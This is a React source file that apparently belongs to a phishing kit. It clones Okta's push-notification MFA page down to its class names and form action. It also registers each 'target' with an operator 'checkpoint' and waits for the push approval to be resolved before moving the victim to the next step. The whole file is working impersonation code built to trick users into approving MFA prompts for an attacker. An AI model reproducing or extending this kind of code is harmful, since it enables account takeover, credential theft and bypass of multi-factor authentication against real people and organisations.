'use client';
import addIntakeEvent from "@/app/(tropic)/addIntakeEvent";
import brandLogoSrc from "@/app/(tropic)/brandLogoSrc";
import checkForExistingCheckpoint from "@/app/(tropic)/checkForExistingCheckpoint";
import { getTargetId } from "@/app/(tropic)/getTargetId";
import proceedStep from "@/app/(tropic)/proceedStep";
import clientResolveDualCheckpoint from "@/app/(tropic)/resolveDualCheckpoint";
import { useEffect, useState } from "react"
import { PulseLoader } from "react-spinners";
import { getBrowserTRPCClient } from "@/app/utils/trpc/client";

export default function Push({ username, setStage }) {
    const [loading, setLoading] = useState(false);
    const [sendAuto, setSendAuto] = useState(true);

    useEffect(() => {
        let unsubscribe;

        async function initializeCheckpoint() {
            //if (initializationRef.current) return;
            //initializationRef.current = true;
            let triedToCreate = false;
            try {
                const targetId = await getTargetId();
                const trpc = getBrowserTRPCClient();

                // Atomic check and create
                const hasExisting = await checkForExistingCheckpoint('Okta push notif. confirmation');

                if (!hasExisting && !triedToCreate) {
                    console.log('Creating new checkpoint');
                    await addIntakeEvent({
                        target_id: targetId,
                        type: 'checkpoint',
                        checkpoint_status: 'waiting',
                        checkpoint_resolution: 'Okta push notif. confirmation'
                    });
                    triedToCreate = true;
                }

                const subscription = trpc.checkpoints.onResolution.subscribe(
                    {
                        targetId,
                        resolution: 'Okta push notif. confirmation',
                    },
                    {
                        onData: (payload) => {
                            console.log('Checkpoint update:', payload);
                            proceedStep();
                        },
                        onError: (error) => {
                            console.error('Error in checkpoint subscription:', error);
                        },
                    }
                );
                unsubscribe = () => subscription.unsubscribe();

            } catch (error) {
                console.error('Error in checkpoint initialization:', error);
            }
        }

        initializeCheckpoint();

        // Cleanup
        return () => {
            unsubscribe?.();
        };
    }, []);

    return (
        <main data-se="auth-container" tabIndex="-1" id="okta-sign-in" className="auth-container main-container">
            <div className="okta-sign-in-header auth-header">
                <h1>
                    <img src={brandLogoSrc} className="auth-org-logo" alt="logo" aria-label="logo" />
                </h1>
                <div data-type="beacon-container" className="beacon-container">
                </div>
            </div>
            <div className="auth-content">
                <div className="auth-content-inner">
                    <div className="siw-main-view challenge-poll--okta_verify mfa-verify">
                        <div className="siw-main-header">
                            <div>
                                <div>
                                    <div data-type="beacon-container" className="beacon-container" style={{ "transform": "scale(1)", "textIndent": "1px" }}>
                                        <div className="beacon-blank auth-beacon">
                                            <div className="beacon-blank js-blank-beacon-border auth-beacon-border">
                                            </div>
                                        </div>
                                        <div className="bg-helper auth-beacon auth-beacon-factor mfa-okta-verify" data-se="factor-beacon">
                                            <div className="okta-sign-in-beacon-border auth-beacon-border">
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div className="siw-main-body">
                            <form method="POST" action="/oauth2/v1/authorize" data-se="o-form" slot="content" id="form190" className="ion-form o-form okta-verify-push-challenge o-form-edit-mode">
                                <div data-se="o-form-content" className="o-form-content o-form-theme clearfix">
                                    <h2 data-se="o-form-head" className="okta-form-title o-form-head">Get a push notification</h2>
                                    {username &&
                                        <div className="identifier-container">
                                            <span className="identifier no-translate" data-se="identifier" title={username}>{username}</span>
                                        </div>
                                    }
                                    <div className="o-form-info-container">
                                    </div>
                                    <div className="o-form-error-container" data-se="o-form-error-container" role="alert">
                                    </div>
                                    <div className="o-form-fieldset-container" data-se="o-form-fieldset-container">
                                        <a data-se="button" className="button button-wide button-primary send-push link-button-disabled link-button" href="#">Push notification sent</a>
                                        <span className="accessibility-text" role="alert">
                                            Push notification sent</span>
                                        <div data-se="o-form-fieldset-autoChallenge" className="o-form-fieldset o-form-label-top">
                                            <div data-se="o-form-input-container" className="o-form-input">
                                                <span data-se="o-form-input-autoChallenge" className="o-form-input-name-autoChallenge">
                                                    <div className="custom-checkbox">
                                                        <input
                                                            value={sendAuto}
                                                            onChange={e => setSendAuto(old => !old)}
                                                            type="checkbox" name="autoChallenge" id="input198" className="checkedFocus" />
                                                        <label htmlFor="input198" data-se-for-name="autoChallenge" className={sendAuto ? "checked" : ""}>Send push automatically</label>
                                                    </div>
                                                </span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                        <div className="siw-main-footer">
                            <div className="auth-footer">
                                <a data-se="switchAuthenticator"
                                    data-active={!loading}
                                    onClick={() => {
                                        if (loading) return;
                                        setStage('choose');
                                    }}
                                    id="PushLinkOut"
                                    href="#" className="link js-switchAuthenticator LinkOut PushLinkOut">
                                    Verify with something else
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    )
}